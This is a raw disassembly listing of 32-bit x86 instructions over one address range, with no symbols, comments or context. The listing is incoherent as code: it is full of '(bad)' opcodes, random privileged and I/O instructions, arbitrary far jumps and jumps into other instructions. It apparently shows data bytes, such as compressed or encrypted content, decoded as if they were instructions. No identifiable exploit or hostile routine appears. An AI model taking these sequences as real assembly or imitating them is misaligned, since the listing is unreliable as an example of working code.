  415193:	jmp    0x4151d8
  415195:	push   eax
  415196:	cmp    BYTE PTR [edx],al
  415198:	dec    ebx
  415199:	sbb    al,0x9
  41519b:	dec    eax
  41519c:	aam    0xf5
  41519e:	sbb    bh,dl
  4151a0:	jnp    0x41515d
  4151a2:	aad    0x3e
  4151a4:	jae    0x415198
  4151a6:	ret    0x2ce1
  4151a9:	push   edi
  4151aa:	loopne 0x4151e4
  4151ac:	mov    al,ds:0x3a76d13e
  4151b1:	in     al,0x88
  4151b3:	add    DWORD PTR [esi+0x39],ebp
  4151b6:	ret    
  4151b7:	mov    ebx,0x948f92f6
  4151bc:	add    cl,al
  4151be:	btc    DWORD PTR [ebx+edx*1],0x51
  4151c3:	mov    ebp,0x9ebb701d
  4151c8:	dec    esp
  4151c9:	xchg   DWORD PTR [eax],eax
  4151cb:	xor    DWORD PTR [ebx],ebx
  4151cd:	cli    
  4151ce:	sub    eax,0xf49a1647
  4151d3:	dec    edi
  4151d4:	dec    esi
  4151d5:	hlt    
  4151d6:	fdiv   QWORD PTR [eax+0x79]
  4151d9:	add    DWORD PTR [ecx],ebp
  4151db:	dec    ebx
  4151dc:	daa    
  4151dd:	jbe    0x41519a
  4151df:	(bad)  
  4151e1:	mov    eax,ds:0xc0312f59
  4151e6:	dec    ecx
  4151e7:	test   al,0x8e
  4151e9:	enter  0xccd6,0xe6
  4151ed:	fbld   TBYTE PTR [esi-0x1b]
  4151f0:	lods   al,BYTE PTR ds:[esi]
  4151f1:	(bad)  
  4151f2:	out    0xf4,al
  4151f4:	ret    
  4151f5:	je     0x4151f5
  4151f7:	int    0xb
  4151f9:	or     bh,BYTE PTR [ebx+edi*2+0x24]
  4151fd:	(bad)  
  4151fe:	push   ecx
  4151ff:	(bad)  
  415200:	rcr    BYTE PTR [edx+0x2c],cl
  415203:	jmp    0x5791:0x9209a68b
  41520a:	push   0x31
  41520c:	jo     0x4151ef
  41520e:	mov    al,0x9e
  415210:	mov    ebx,0x6d666e8e
  415215:	cmp    al,BYTE PTR [eax-0x780d4e83]
  41521b:	(bad)  
  41521c:	pop    ds
  41521d:	mov    esp,0xe176b4f0
  415222:	sbb    dl,cl
  415224:	sbb    al,0xc1
  415226:	lods   al,BYTE PTR ds:[esi]
  415227:	test   al,0xb3
  415229:	out    dx,al
  41522a:	push   edx
  41522b:	in     al,dx
  41522c:	jle    0x41525e
  41522e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41522f:	inc    edx
  415230:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415231:	pop    ebp
  415232:	xchg   ecx,eax
  415233:	mov    al,ds:0x23dfb4f5
  415238:	jle    0x415265
  41523a:	pop    ebx
  41523b:	dec    eax
  41523c:	daa    
  41523d:	in     eax,0x3e
  41523f:	or     ebx,edi
  415241:	lea    ebx,[ebx+eiz*8-0x1c]
  415245:	jl     0x41520f
  415247:	lahf   
  415248:	popa   
  415249:	dec    eax
  41524a:	cmp    ebx,ecx
  41524c:	mov    ah,0x98
  41524e:	xor    al,0xa1
  415250:	jg     0x415210
  415252:	pop    ds
  415253:	sub    eax,0x1bf97716
  415258:	mov    ah,0x23
  41525a:	pop    esi
  41525b:	fnstcw WORD PTR [eax-0x45527d62]
  415261:	inc    edx
  415262:	mov    esi,0x17f06b28
  415267:	mov    cl,0x1f
  415269:	stc    
  41526a:	(bad)  
  41526b:	pop    ss
  41526c:	push   eax
  41526d:	adc    al,0xd
  41526f:	sub    esi,DWORD PTR [ebp-0x2aef745d]
  415275:	loope  0x4151f7
  415277:	inc    ecx
  415278:	ja     0x415209
  41527a:	inc    ecx
  41527b:	dec    eax
  41527c:	(bad)  es:[esi-0x241bf6b5]
  415283:	lods   eax,DWORD PTR ds:[esi]
  415284:	mov    eax,ds:0xad1cfd9e
  415289:	ss aaa 
  41528b:	dec    esp
  41528c:	mov    ds:0xae2030b2,al
  415291:	lods   eax,DWORD PTR ds:[esi]
  415292:	dec    ebx
  415293:	js     0x41529b
  415295:	shl    DWORD PTR [ebp+0x59688e74],cl
  41529b:	sahf   
  41529c:	jo     0x415308
  41529e:	ins    DWORD PTR es:[edi],dx
  41529f:	jp     0x415314
  4152a1:	jb     0x41530a
  4152a3:	mov    eax,ds:0x362cb294
  4152a8:	outs   dx,BYTE PTR ds:[esi]
  4152a9:	push   esi
  4152aa:	test   BYTE PTR [ecx-0x55f04785],bh
  4152b0:	push   edi
  4152b1:	neg    edx
  4152b3:	pushf  
  4152b4:	adc    DWORD PTR [esi-0x774adccb],ebx
  4152ba:	inc    ebp
  4152bb:	adc    ebx,DWORD PTR [edx-0x55]
  4152be:	into   
  4152bf:	call   0xa1399e5f
  4152c4:	cli    
  4152c5:	pop    eax
  4152c6:	int3   
  4152c7:	cmp    dl,cl
  4152c9:	pop    edi
  4152ca:	aad    0x72
  4152cc:	dec    ebp
  4152cd:	adc    eax,0x3ba28585
  4152d2:	jne    0x4152d8
  4152d4:	mov    ?,WORD PTR [eax-0x6e]
  4152d7:	mov    ah,BYTE PTR [ecx+0x39fc923e]
  4152dd:	les    eax,FWORD PTR [ecx]
  4152df:	imul   DWORD PTR ds:0x120a5452
  4152e5:	test   BYTE PTR [ebx+edi*2],cl
  4152e8:	mov    ebp,DWORD PTR ds:0xd04cab76
  4152ee:	inc    esp
  4152ef:	arpl   WORD PTR [esi],bx
  4152f1:	sbb    al,0x95
  4152f3:	sar    BYTE PTR [ecx],cl
  4152f5:	push   esp
  4152f6:	sbb    bh,BYTE PTR [edi-0x68ccf9ec]
  4152fc:	and    eax,0x1f1bea0a
  415301:	push   esi
  415302:	icebp  
  415303:	sub    DWORD PTR [ecx-0x1b],0xffffffbe
  415307:	fwait
  415308:	mov    al,0xe4
  41530a:	pop    es
  41530b:	in     eax,dx
  41530c:	xchg   DWORD PTR [edx-0x32],ecx
  41530f:	and    BYTE PTR [ecx-0x2c],ah
  415312:	pop    esp
  415313:	imul   eax,esp,0xffffffa2
  415316:	sub    al,0xc5
  415318:	mov    edi,0x880621e6
  41531d:	ret    
  41531e:	push   0x393f293c
  415323:	aad    0xb5
  415325:	dec    ebp
  415326:	xchg   ebp,eax
  415327:	dec    ebp
  415328:	xlat   BYTE PTR ds:[ebx]
  415329:	loop   0x4152f1
  41532b:	sbb    al,cl
  41532d:	sub    BYTE PTR [ecx+0x1d],ch
  415330:	push   ss
  415331:	ret    0x8c3e
  415334:	adc    al,0xc7
  415336:	adc    al,0x80
  415338:	mov    ebx,0xd1d7b615
  41533d:	mov    bl,BYTE PTR [ebx]
  41533f:	(bad)  
  415340:	adc    eax,0x54f8afc8
  415345:	(bad)  [ebx]
  415347:	and    eax,0xd5366ac3
  41534c:	mov    ecx,0xf5f71f2a
  415351:	fcmovne st,st(1)
  415353:	retf   
  415354:	fcmovbe st,st(1)
  415356:	cld    
  415357:	or     DWORD PTR [edx],0xe5353c8a
  41535d:	repnz stos BYTE PTR es:[edi],al
  41535f:	push   eax
  415360:	scas   al,BYTE PTR es:[edi]
  415361:	pop    eax
  415362:	mov    esi,0x2c0199a2
  415367:	fwait
  415368:	xchg   edx,eax
  415369:	repz add BYTE PTR [esi+0x5f],ch
  41536d:	sbb    cl,0x3c
  415370:	push   cs
  415371:	into   
  415372:	lds    eax,FWORD PTR [eax+0x51]
  415375:	mov    esi,0x7c744a0f
  41537a:	mov    esi,0x11cbe74c
  41537f:	fsubr  QWORD PTR ds:0xd599cfd4
  415385:	sub    bh,bl
  415387:	pop    edi
  415388:	cmc    
  415389:	imul   ebp,DWORD PTR [esi-0x2bd09f28],0xffffffc3
  415390:	mov    bl,0x92
  415392:	je     0x415395
  415394:	pop    edx
  415395:	repz push eax
  415397:	(bad)  
  415398:	into   
  415399:	es test al,0x97
  41539c:	and    eax,0xc8f07774
  4153a1:	mov    bl,ah
  4153a3:	mul    dl
  4153a5:	icebp  
  4153a6:	mov    dh,0x5e
  4153a8:	out    dx,al
  4153a9:	hlt    
  4153aa:	inc    esp
  4153ab:	stos   BYTE PTR es:[edi],al
  4153ac:	int3   
  4153ad:	and    edx,DWORD PTR [edi+0x7e]
  4153b0:	imul   edx,esi,0xf42c93de
  4153b6:	sbb    eax,0x1fec38bb
  4153bb:	rcl    DWORD PTR [edi+0x13944374],0xfb
  4153c2:	test   al,0x52
  4153c4:	add    BYTE PTR [ebp-0x49b0d2c6],al
  4153ca:	and    eax,0x7791e8d
  4153cf:	cmc    
  4153d0:	jecxz  0x4153d1
  4153d2:	and    eax,0x4050f57e
  4153d7:	sub    eax,DWORD PTR [eax-0x19]
  4153da:	pop    esi
  4153db:	int3   
  4153dc:	xchg   BYTE PTR [eax-0x75717019],cl
  4153e2:	retf   0x9047
  4153e5:	push   ds
  4153e6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4153e7:	lock mov dl,0xbc
  4153ea:	pushf  
  4153eb:	mov    dl,0x3a
  4153ed:	mov    ds:0xda41834d,al
  4153f2:	js     0x415456
  4153f4:	xlat   BYTE PTR ds:[ebx]
  4153f5:	sbb    eax,0x4ad39712
  4153fa:	inc    ebp
  4153fb:	adc    edi,DWORD PTR [ebx]
  4153fd:	(bad)  
  4153fe:	(bad)  
  4153ff:	not    BYTE PTR ss:[edx+0x26]
  415403:	nop
  415404:	and    ecx,DWORD PTR [esi+0x770f8c44]
  41540a:	or     eax,0xa1205755
  41540f:	pushf  
  415410:	add    DWORD PTR [esi+0x129cfa9e],esi
  415416:	jmp    0x4153d5
  415418:	mov    edi,0x38277742
  41541d:	and    ebp,DWORD PTR [edi]
  41541f:	xlat   BYTE PTR ds:[ebx]
  415420:	ds cwde 
  415422:	or     BYTE PTR [edx+0x2c],al
  415425:	fistp  WORD PTR [ebp+0x16]
  415428:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415429:	fisub  DWORD PTR [eax]
  41542b:	push   cs
  41542c:	cwde   
  41542d:	outs   dx,DWORD PTR ds:[esi]
  41542e:	call   0x2964c8cc
  415433:	inc    ebx
  415434:	xor    al,0x58
  415436:	(bad)  
  415437:	cdq    
  415438:	inc    ebx
  415439:	ret    
  41543a:	in     al,dx
  41543b:	ja     0x41549a
  41543d:	dec    ebx
  41543e:	rcl    esp,cl
  415440:	cmp    al,0xa6
  415442:	mov    esp,ebp
  415444:	sbb    DWORD PTR ds:0x84d3badf,edx
  41544a:	test   eax,0xbe3c153a
  41544f:	jp     0x415482
  415451:	push   ds
  415452:	std    
  415453:	jno    0x415423
  415455:	pop    ebx
  415456:	aad    0xa7
  415458:	mov    ds:0xd0d99832,eax
  41545d:	xor    al,0x6d
  41545f:	icebp  
  415460:	in     eax,0xee
  415462:	arpl   si,dx
  415464:	inc    ebx
  415465:	and    al,0x29
  415467:	into   
  415468:	cwde   
  415469:	rcl    eax,cl
  41546b:	sbb    dl,dl
  41546d:	mov    al,ah
  41546f:	xor    al,0x4a
  415471:	mov    ebx,0xa779b8a8
  415476:	or     al,BYTE PTR [bx+di]
  415479:	cdq    
  41547a:	mov    ebp,0x5046e3e0
  41547f:	xchg   ebx,eax
  415480:	mov    al,0x63
  415482:	sub    DWORD PTR [edx+0x59],0x61
  415486:	in     al,0xa8
  415488:	aas    
  415489:	mov    eax,DWORD PTR [edx]
  41548b:	retf   
  41548c:	sar    BYTE PTR [ecx+0x6e05b5cf],cl
  415492:	outs   dx,BYTE PTR ds:[esi]
  415493:	dec    esi
  415494:	imul   ecx,DWORD PTR [ebx+0x4dea7b99],0xa396d0b1
  41549e:	add    ebx,DWORD PTR [ecx]
  4154a0:	dec    ebx
  4154a1:	lock jb 0x415491
  4154a4:	sbb    ebp,DWORD PTR [edx+0x4]
  4154a7:	mov    ds:0x6280b37a,eax
  4154ac:	or     eax,0x784e5fc8
  4154b1:	ficomp WORD PTR [esp+edx*4+0x48]
  4154b5:	xchg   esp,eax
  4154b6:	push   ss
  4154b7:	dec    esp
  4154b8:	fdivr  DWORD PTR [edi-0x68d35878]
  4154be:	mov    ds:0x49d45728,al
  4154c3:	push   edx
  4154c4:	push   esi
  4154c5:	call   FWORD PTR [eax-0x38d9d357]
  4154cb:	fdiv   DWORD PTR [ebp+0x10]
  4154ce:	sbb    DWORD PTR [ebp-0x6e],ecx
  4154d1:	and    DWORD PTR [ebp-0x17770e88],ebp
  4154d7:	fisttp WORD PTR [esi-0x2d2bb6f6]
  4154dd:	stos   BYTE PTR es:[edi],al
  4154de:	push   edx
  4154df:	retf   
  4154e0:	shl    DWORD PTR [edi-0x2909e2ce],cl
  4154e6:	or     al,0x1
  4154e8:	mov    ?,ebx
  4154ea:	sub    al,al
  4154ec:	sbb    eax,0xa725ef9e
  4154f1:	(bad)  
  4154f2:	pushf  
  4154f3:	sar    BYTE PTR [ecx-0x1609d2b3],1
  4154f9:	xor    BYTE PTR [eax+0x2092ff4],al
  4154ff:	popf   
  415500:	push   ecx
  415501:	jmp    0x987e:0xbcc56e43
  415508:	sbb    ecx,DWORD PTR [ebx]
  41550a:	mov    cl,BYTE PTR [edx-0x4a]
  41550d:	rcr    DWORD PTR [edx+ecx*1-0x646687b1],cl
  415514:	adc    esi,DWORD PTR [edx]
  415516:	mov    dl,0x72
  415518:	mov    ds:0x590a8bad,eax
  41551d:	xor    eax,0x5d9e7366
  415522:	daa    
  415523:	xlat   BYTE PTR ds:[ebx]
  415524:	jge    0x415559
  415526:	rcr    BYTE PTR ds:0x2012d9e1,0x19
  41552d:	pop    ebp
  41552e:	lock xchg al,al
  415531:	adc    al,BYTE PTR [edx+eiz*4+0x7bf22c6f]
  415538:	scas   eax,DWORD PTR es:[edi]
  415539:	test   eax,0x69c41a8f
  41553e:	aaa    
  41553f:	arpl   WORD PTR [edx+0x6b],sp
  415542:	or     DWORD PTR [edx+0x5473b7c8],ebp
  415548:	mov    edx,0x738d055f
  41554d:	out    dx,eax
  41554e:	jno    0x415590
  415550:	push   0xffffffaf
  415552:	jb     0x4155c5
  415554:	adc    BYTE PTR [esi],dh
  415556:	or     ebp,eax
  415558:	pop    edx
  415559:	ror    DWORD PTR [edi-0x21c2ab11],cl
  41555f:	add    DWORD PTR ds:0x98d1bcc9,edi
  415565:	mov    ebx,0x8acd5a6e
  41556a:	adc    DWORD PTR [eax+0x3d],ebx
  41556d:	mov    ebx,0x85d289c7
  415572:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415573:	outs   dx,DWORD PTR ds:[esi]
  415574:	test   DWORD PTR [edx-0xd4359f3],esi
  41557a:	cmp    eax,0x5c43051a
  41557f:	fcom   QWORD PTR gs:[edx]
  415582:	lea    esp,[edi+0x67]
  415585:	stc    
  415586:	ffreep st(3)
  415588:	popf   
  415589:	sbb    ebx,DWORD PTR es:[edx+ebp*8+0x3]
  41558e:	out    dx,al
  41558f:	hlt    
  415590:	add    ah,BYTE PTR [eax-0x1b77f698]
  415596:	aad    0x32
  415598:	repz mov edx,0xb0f9e3f8
  41559e:	mov    ds:0x3aab07c4,al
  4155a3:	cmp    al,0x5b
  4155a5:	push   edi
  4155a6:	cs (bad) 
  4155a8:	adc    al,0x8a
  4155aa:	cdq    
  4155ab:	adc    ecx,DWORD PTR [eax-0x4c]
  4155ae:	in     al,dx
  4155af:	in     eax,dx
  4155b0:	(bad)  
  4155b2:	mov    WORD PTR [eax+0x151732b5],fs
  4155b8:	dec    edx
  4155b9:	icebp  
  4155ba:	dec    ecx
  4155bb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4155bc:	push   esp
  4155bd:	sbb    eax,0x8421c894
  4155c2:	or     BYTE PTR [eax],ch
  4155c4:	stos   BYTE PTR es:[edi],al
  4155c5:	xor    ecx,ebp
  4155c7:	and    eax,0x54135361
  4155cc:	ret    0x773c
  4155cf:	sub    al,0xf7
  4155d1:	sbb    al,0x2f
  4155d3:	aad    0xf8
  4155d5:	xchg   ebp,eax
  4155d6:	shl    ebx,1
  4155d8:	pushf  
  4155d9:	lea    edx,[esi+0x1d]
  4155dc:	push   esp
  4155dd:	push   cs
  4155de:	push   ecx
  4155df:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4155e0:	fsubr  QWORD PTR [esi+0x59dcbd33]
  4155e6:	(bad)  
  4155e7:	sub    al,dl
  4155e9:	inc    esi
  4155ea:	or     edi,esi
  4155ec:	push   ebp
  4155ed:	bound  ebp,QWORD PTR [ecx]
  4155ef:	stos   DWORD PTR es:[edi],eax
  4155f0:	mov    dh,ah
  4155f2:	fdiv   QWORD PTR ds:0xb43370e0
  4155f8:	mov    ch,0x9f
  4155fa:	in     al,dx
  4155fb:	inc    edx
  4155fc:	(bad)  
  4155fd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4155fe:	aas    
  4155ff:	mov    al,0xc8
  415601:	push   edi
  415602:	(bad)  
  415603:	pushf  
  415604:	out    0x59,al
  415606:	loope  0x4155a3
  415608:	retf   0xaf68
  41560b:	ja     0x41565f
  41560d:	jae    0x415639
  41560f:	push   edx
  415610:	(bad)  
  415612:	sub    BYTE PTR [ebp+edx*4+0x7e0c23b6],ah
  415619:	adc    DWORD PTR [eax+0x2702362e],ecx
  41561f:	aad    0xf6
  415621:	xor    al,BYTE PTR [edx]
  415623:	test   al,0x93
  415625:	mov    dl,0x60
  415627:	add    al,0xff
  415629:	add    al,0x92
  41562b:	lock into 
  41562d:	cdq    
  41562e:	sar    ch,0xac
  415631:	or     edi,ebp
  415633:	sti    
  415634:	in     eax,dx
  415635:	fsub   st(4),st
  415637:	not    ch
  415639:	xchg   edx,eax
  41563a:	enter  0x6fff,0xb6
  41563e:	ins    BYTE PTR es:[edi],dx
  41563f:	outs   dx,DWORD PTR ds:[esi]
  415640:	sti    
  415641:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415642:	(bad)
  415645:	repz scas eax,DWORD PTR es:[edi]
  415647:	jmp    0x2c89f331
  41564c:	sub    al,0x7e
  41564e:	jge    0x415600
  415650:	jo     0x4156a7
  415652:	shl    BYTE PTR [edx+0x67],1
  415655:	mov    ?,edx
  415657:	scas   al,BYTE PTR es:[edi]
  415658:	and    eax,0x870c117e
  41565d:	into   
  41565e:	lahf   
  41565f:	push   ebp
  415660:	out    0xa6,al
  415662:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415663:	mov    ch,0x54
  415665:	jg     0x41563c
  415667:	pop    esp
  415668:	sub    esp,ecx
  41566a:	add    eax,0x7109020b
  41566f:	or     eax,0xd7fcf43f
  415674:	out    0xa8,eax
  415676:	dec    esi
  415677:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415678:	adc    DWORD PTR [ecx],eax
  41567a:	repz mov WORD PTR [ebp+0x2f],es
  41567e:	mov    edx,0x162c05cf
  415683:	xchg   DWORD PTR [edx+0x60f3c09c],esp
  415689:	das    
  41568a:	push   0x77986292
  41568f:	imul   ebp,DWORD PTR [eax+0x527997de],0xffffffdd
  415696:	jp     0x4156fb
  415698:	xor    al,0xee
  41569a:	mov    DWORD PTR [eax+0x31],ebx
  41569d:	out    dx,eax
  41569e:	or     eax,0xb75a7a61
  4156a3:	ds mov cl,0xee
  4156a6:	xchg   esp,eax
  4156a7:	add    DWORD PTR [eax-0x21],edx
  4156aa:	fs xchg al,dh
  4156ad:	add    BYTE PTR [ebp-0xd],ah
  4156b0:	retf   
  4156b1:	mov    dh,BYTE PTR [edi-0x70]
  4156b4:	cmp    al,0x8b
  4156b6:	dec    eax
  4156b7:	mov    DWORD PTR [esi],edi
  4156b9:	push   ebp
  4156ba:	cmp    al,bh
  4156bc:	lods   al,BYTE PTR ds:[esi]
  4156bd:	push   esp
  4156be:	xlat   BYTE PTR ds:[ebx]
  4156bf:	ret    
  4156c0:	mov    bh,bl
  4156c2:	xchg   ebx,eax
  4156c3:	in     al,0xd8
  4156c5:	jnp    0x415655
  4156c7:	cdq    
  4156c8:	mov    esp,0x3024b8ce
  4156cd:	push   eax
  4156ce:	inc    eax
  4156cf:	adc    esi,DWORD PTR cs:[ebp+0x793de106]
  4156d6:	mov    bh,0x52
  4156d8:	mov    dh,BYTE PTR [ebx-0x6ede346b]
  4156de:	mov    ebx,0xa537cb3c
  4156e3:	jnp    0x415666
  4156e5:	dec    eax
  4156e6:	jp     0x41568f
  4156e8:	test   esp,edi
  4156ea:	aas    
  4156eb:	hlt    
  4156ec:	inc    edx
  4156ed:	pushf  
  4156ee:	das    
  4156ef:	inc    edi
  4156f0:	fcmovu st,st(5)
  4156f2:	lock ret 
  4156f4:	in     eax,dx
  4156f5:	out    dx,al
  4156f6:	arpl   si,cx
  4156f8:	popf   
  4156f9:	jo     0x415716
  4156fb:	and    ebp,DWORD PTR [ebp+0x68]
  4156fe:	ret    
  4156ff:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415700:	mov    eax,0xf26e0a28
  415705:	adc    DWORD PTR [edi],esi
  415707:	loop   0x4156a9
  415709:	push   ebx
  41570a:	pop    ecx
  41570b:	dec    edx
  41570c:	dec    ecx
  41570d:	in     eax,dx
  41570e:	mov    bh,0x7c
  415710:	data16 stc 
  415712:	sbb    eax,0x5be946d8
  415717:	inc    ecx
  415718:	into   
  415719:	out    0xe6,al
  41571b:	mov    bh,0x9a
  41571d:	and    ecx,DWORD PTR [esi+eax*2-0x5]
  415721:	inc    ebp
  415722:	stos   BYTE PTR es:[edi],al
  415723:	inc    ebx
  415724:	adc    eax,0x6815b84b
  415729:	sub    al,BYTE PTR [edi+0x26]
  41572c:	sbb    BYTE PTR [edx-0x37],dl
  41572f:	clc    
  415730:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415731:	dec    ebp
  415732:	retf   
  415733:	call   0x24f8:0x35e3b7a4
  41573a:	outs   dx,DWORD PTR ds:[esi]
  41573b:	lods   al,BYTE PTR ds:[esi]
  41573c:	clc    
  41573d:	sahf   
  41573e:	jmp    0xa6bb7642
  415743:	test   al,0x26
  415745:	push   cs
  415746:	add    al,0x3
  415748:	pop    esp
  415749:	fisttp WORD PTR [ebx+0x3df69ef5]
  41574f:	inc    esi
  415750:	stos   BYTE PTR es:[edi],al
  415751:	mov    eax,ds:0x77ab137a
  415756:	push   edi
  415757:	ds pop ebp
  415759:	jmp    0x6570b2a0
  41575e:	add    esp,edi
  415760:	adc    DWORD PTR [ebx],ebx
  415762:	outs   dx,DWORD PTR ds:[esi]
  415763:	pop    eax
  415764:	or     BYTE PTR [edx-0x7ed08174],dh
  41576a:	add    bl,BYTE PTR [esi+0x75e7877d]
  415770:	xor    edi,DWORD PTR [ebp+0x25f29983]
  415776:	popf   
  415777:	mov    cl,0x2d
  415779:	xchg   ebx,eax
  41577a:	fmul   DWORD PTR [edx]
  41577c:	jb     0x4157d2
  41577e:	test   BYTE PTR [esi+0x2ee54f70],ah
  415784:	add    eax,0x93900b7c
  415789:	into   
  41578a:	xchg   ebp,eax
  41578b:	jmp    0x7683f9cd
  415790:	call   0x26ef:0xa3f3b609
  415797:	div    DWORD PTR [edi-0x2765e3f0]
  41579d:	adc    dl,BYTE PTR [eax+0x46444581]
  4157a3:	lods   al,BYTE PTR ds:[esi]
  4157a4:	out    dx,eax
  4157a5:	ss pop ds
  4157a7:	pop    esp
  4157a8:	sbb    edi,DWORD PTR [esi]
  4157aa:	adc    ah,BYTE PTR [ebx+0x2f89c704]
  4157b0:	push   ecx
  4157b1:	adc    bh,cl
  4157b3:	shr    BYTE PTR [edi],1
  4157b5:	fsub   st(1),st
  4157b7:	je     0x4157ff
  4157b9:	add    dh,BYTE PTR [esi+eax*1-0x71]
  4157bd:	stos   BYTE PTR es:[edi],al
  4157be:	dec    ebp
  4157bf:	fisub  DWORD PTR [esi]
  4157c1:	call   0x5b4a460d
  4157c6:	jnp    0x4157f3
  4157c8:	mov    edx,0xd56ef6a7
  4157cd:	push   esi
  4157ce:	inc    edx
  4157cf:	addr16 je 0x41581f
  4157d2:	jnp    0x4157e2
  4157d4:	mov    al,ds:0x8212f3f0
  4157d9:	ds stc 
  4157db:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4157dc:	add    ebp,DWORD PTR [eax+0x11867abc]
  4157e2:	stos   BYTE PTR es:[edi],al
  4157e3:	adc    al,0x38
  4157e5:	sub    BYTE PTR [ecx+0xe398a6e],bh
  4157eb:	std    
  4157ec:	mov    bh,0x4f
  4157ee:	xor    DWORD PTR [ebx-0x736c6c26],esp
  4157f4:	cli    
  4157f5:	pop    esp
  4157f6:	or     BYTE PTR ds:0x6dab6b1b,dl
  4157fc:	fst    st(0)
  4157fe:	mov    dl,0xf0
  415800:	ja     0x415808
  415802:	xchg   edx,eax
  415803:	cmp    al,0x9a
  415805:	sbb    ecx,ebx
  415807:	jmp    0xc8fe:0x82eda061
  41580e:	in     al,0x6
  415810:	push   ecx
  415811:	inc    ebp
  415812:	icebp  
  415813:	arpl   dx,bp
  415815:	inc    esi
  415816:	jns    0x415831
  415818:	ins    DWORD PTR es:[edi],dx
  415819:	jo     0x4157aa
  41581b:	inc    ebp
  41581c:	adc    cl,BYTE PTR [edx]
  41581e:	daa    
  41581f:	pushf  
  415820:	adc    ebp,ebp
  415822:	(bad)  
  415823:	retfw  0xb01a
  415827:	inc    esp
  415828:	data16 xchg BYTE PTR [ebx+0x62aed9da],cl
  41582f:	mov    ah,0xb8
  415831:	data16 mov es,WORD PTR [esi]
  415834:	(bad)  
  415835:	loope  0x4158ac
  415837:	add    dl,BYTE PTR [ebx]
  415839:	fistp  DWORD PTR [eax-0x391f1756]
  41583f:	cmp    BYTE PTR [eax+esi*4],dl
  415842:	clc    
  415843:	push   0x86fae4d5
  415848:	addr16 mov eax,ds:0x21a8
  41584c:	in     eax,dx
  41584d:	dec    ecx
  41584e:	jecxz  0x41583a
  415850:	inc    ebp
  415851:	scas   eax,DWORD PTR es:[edi]
  415852:	sar    DWORD PTR [eax-0x3980c8aa],0xef
  415859:	mov    edi,0x4789240
  41585e:	dec    edi
  41585f:	out    dx,eax
  415860:	sbb    ecx,DWORD PTR [ecx+0x42]
  415863:	mov    ecx,0x85dc2f2f
  415868:	or     BYTE PTR [esi+0x62],dl
  41586b:	pop    esi
  41586c:	sar    ebx,1
  41586e:	xchg   BYTE PTR ds:0x2e9bc7e0,ch
  415874:	in     al,0xd8
  415876:	cmp    al,0x39
  415878:	xchg   DWORD PTR [edx],ecx
  41587a:	mov    dh,0x4d
  41587c:	loope  0x415847
  41587e:	(bad)  
  41587f:	inc    ebp
  415880:	outs   dx,DWORD PTR ds:[esi]
  415881:	fnstcw WORD PTR [edx]
  415883:	sbb    cl,BYTE PTR [eax-0x57]
  415886:	and    edx,DWORD PTR [edx-0x16]
  415889:	jle    0x41587a
  41588b:	lds    esp,FWORD PTR [ecx]
  41588d:	dec    ebp
  41588e:	(bad)  
  41588f:	xchg   edx,eax
  415890:	aad    0x94
  415892:	call   0x6494:0xae11a7b3
  415899:	pop    edi
  41589a:	rcl    BYTE PTR [ebx-0x6b364146],0xed
  4158a1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4158a2:	mov    dh,0xc6
  4158a4:	aam    0x9f
  4158a6:	ja     0x415912
  4158a8:	stos   BYTE PTR es:[edi],al
  4158a9:	js     0x41591d
  4158ab:	lods   al,BYTE PTR ds:[esi]
  4158ac:	daa    
  4158ad:	aaa    
  4158ae:	loopne 0x415911
  4158b0:	mov    eax,ds:0x9c18b65b
  4158b5:	not    DWORD PTR [edx+eiz*8-0x5f]
  4158b9:	xor    al,0x2
  4158bb:	data16 hlt 
  4158bd:	cwde   
  4158be:	mov    BYTE PTR [esi+0x53fb0351],bh
  4158c4:	jae    0x415875
  4158c6:	pop    ebp
  4158c7:	mov    edi,DWORD PTR [ebp-0x2b744b74]
  4158cd:	or     edx,DWORD PTR [ebp+0x34]
  4158d0:	stc    
  4158d1:	pop    edi
  4158d2:	dec    ecx
  4158d3:	jnp    0x415930
  4158d5:	add    ebp,DWORD PTR [ecx+0x53]
  4158d8:	ins    BYTE PTR es:[edi],dx
  4158d9:	ja     0x415860
  4158db:	mov    dh,0x94
  4158dd:	cmc    
  4158de:	sbb    DWORD PTR [ebp-0x26],edi
  4158e1:	jnp    0x41589f
  4158e3:	ret    
  4158e4:	icebp  
  4158e5:	or     dl,BYTE PTR [ebx]
  4158e7:	add    al,0xbb
  4158e9:	xchg   BYTE PTR [ebx],ch
  4158eb:	mov    edi,0x1366f6ba
  4158f0:	push   0x20
  4158f2:	outs   dx,BYTE PTR ds:[esi]
  4158f3:	xchg   edi,eax
  4158f4:	mov    al,ds:0x433c914
  4158f9:	mov    ah,0xfb
  4158fb:	cmovl  edx,DWORD PTR [ecx-0x41b8dd11]
  415902:	adc    bl,BYTE PTR [edi+0xd]
  415905:	ja     0x415915
  415907:	push   esp
  415908:	fild   DWORD PTR [ecx-0x49]
  41590b:	cld    
  41590c:	mov    ebp,0x1c647887
  415911:	repz push 0x7d
  415914:	push   0x5d
  415916:	pop    ss
  415917:	mov    eax,ds:0x2ac28e44
  41591c:	dec    ebx
  41591d:	cld    
  41591e:	xor    edi,DWORD PTR [esi+0x111148d5]
  415924:	aas    
  415925:	cmp    eax,0x69ab862d
  41592a:	or     eax,0x124e6e68
  41592f:	push   ecx
  415930:	jae    0x415930
  415932:	jo     0x415985
  415934:	pop    ds
  415935:	mov    edx,0xb9c71699
  41593a:	mov    bl,0xd
  41593c:	jno    0x415949
  41593e:	scas   al,BYTE PTR es:[edi]
  41593f:	xchg   esp,eax
  415940:	pop    ebx
  415941:	cli    
  415942:	dec    edi
  415943:	jae    0x41597c
  415945:	jno    0x4158d9
  415947:	xor    ch,BYTE PTR [esi-0x64]
  41594a:	add    ecx,DWORD PTR [edi-0x3c0a02ce]
